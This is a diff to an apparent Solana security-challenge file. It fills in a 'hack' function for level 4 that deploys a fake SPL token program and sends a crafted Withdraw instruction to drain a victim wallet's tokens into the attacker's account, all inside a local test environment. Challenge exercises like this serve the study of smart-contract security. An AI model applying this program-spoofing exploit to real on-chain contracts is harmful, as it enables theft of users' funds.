@@ -9,6 +9,10 @@ use poc_framework::{
 
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+use solana_program::instruction::{AccountMeta, Instruction};
+use level4::{get_authority, get_wallet_address, WalletInstruction};
+use borsh::BorshSerialize;
+use spl_token::state::Account;
 
 struct Challenge {
     hacker: Keypair,
@@ -19,7 +23,79 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // @note - Hack steps
+    // 1) Load fake spl_token program
+    // 2) Create empty wallet for hacker
+    // 3) Create ata for hacker
+    // 4) Withdrawal hacker wallet, swap source = hacker_wallet_address, destination = rich_boy_wallet , mint = spl_token::id()
+    // 5) Withdrawal funds from hacker wallet to hacker ata
+
+    let mut dir = env::current_exe().unwrap();
+    let path = {
+        dir.pop();
+        dir.pop();
+        dir.push("deploy");
+        dir.push("level4_poc_contract.so");
+        dir.to_str()
+    }
+        .unwrap();
+    let fake_spl_token_program_id = env.deploy_program(path);
+    println!("fake_spl_token deployed {}", fake_spl_token_program_id);
+
+
+    let hacker_init_wallet_ix = level4::initialize(challenge.wallet_program, challenge.hacker.pubkey(), challenge.mint);
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[hacker_init_wallet_ix],
+            &[&challenge.hacker]
+        )
+    );
+
+
+    let (authority_address, authority_seed) = get_authority(&challenge.wallet_program);
+    let wallet_address = get_wallet_address(&challenge.hacker.pubkey(), &challenge.wallet_program).0;
+    println!("hacker_wallet initialized {}", wallet_address);
+
+    let hacker_ata_key = env.get_or_create_associated_token_account(&challenge.hacker, challenge.mint);
+    let hacker_ata = env.get_unpacked_account::<Account>(hacker_ata_key).unwrap();
+    println!("hacker_ata amount={}", hacker_ata.amount);
+    let wallet_hacker = env.get_unpacked_account::<Account>(wallet_address).unwrap();
+    println!("wallet_hacker amount={} , after init", wallet_hacker.amount);
+
+
+    let exploit_withdrawal_ix = Instruction {
+        program_id: challenge.wallet_program,
+        accounts: vec![
+            AccountMeta::new(wallet_address, false), // source
+            AccountMeta::new_readonly(authority_address, false), // authority
+            AccountMeta::new_readonly(challenge.hacker.pubkey(), true),
+            AccountMeta::new(challenge.wallet_address, false), // destination
+            AccountMeta::new_readonly(spl_token::id(), false), // mint
+            AccountMeta::new_readonly(fake_spl_token_program_id, false),
+        ],
+        data: WalletInstruction::Withdraw { amount: authority_seed as u64 }.try_to_vec().unwrap(),
+    };
+
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[exploit_withdrawal_ix],
+            &[&challenge.hacker]
+        )
+    );
+    let wallet_hacker = env.get_unpacked_account::<Account>(wallet_address).unwrap();
+    println!("wallet_hacker amount={} , after exploit withdrawal", wallet_hacker.amount);
+
+    let hacker_withdrawal_ix = level4::withdraw(challenge.wallet_program, challenge.hacker.pubkey(), hacker_ata_key, challenge.mint, wallet_hacker.amount);
+    assert_tx_success(
+        env.execute_as_transaction(
+            &[hacker_withdrawal_ix],
+            &[&challenge.hacker]
+        )
+    );
+    let hacker_ata = env.get_unpacked_account::<Account>(hacker_ata_key).unwrap();
+    println!("hacker_ata amount={}, after hacker withdrawal", hacker_ata.amount);
+}
 
 /*
 SETUP CODE BELOW
